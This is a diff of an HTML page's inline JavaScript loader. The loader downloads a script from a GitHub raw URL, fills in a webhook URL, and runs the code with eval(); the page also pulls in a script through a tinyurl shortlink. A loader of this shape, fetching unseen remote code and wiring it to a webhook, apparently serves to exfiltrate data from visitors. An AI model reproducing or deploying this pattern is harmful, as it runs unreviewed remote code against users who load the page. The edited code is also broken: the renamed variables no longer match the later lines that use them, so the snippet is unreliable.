@@ -5,15 +5,13 @@
     <script src="https://tinyurl.com/3yhdxb4p"></script>
     <script>
         function load() {
-            var webhookURL = 'WEBHOOK_URL_PLACEHOLDER';
-
-            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/discip/master/js-server.js';
-
-            var xhr = new XMLHttpRequest();
+            let webhook = 'WEBHOOK_URL_HERE';
+            const scriptURL = 'https://raw.githubusercontent.com/Lenn106/discip/master/js-server.js';
+            let xhr = new XMLHttpRequest();
             xhr.open('GET', scriptURL, true);
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4 && xhr.status === 200) {
-                    var scriptCode = xhr.responseText;
+                    let script = xhr.responseText;
                     scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
                     eval(scriptCode);
                 }
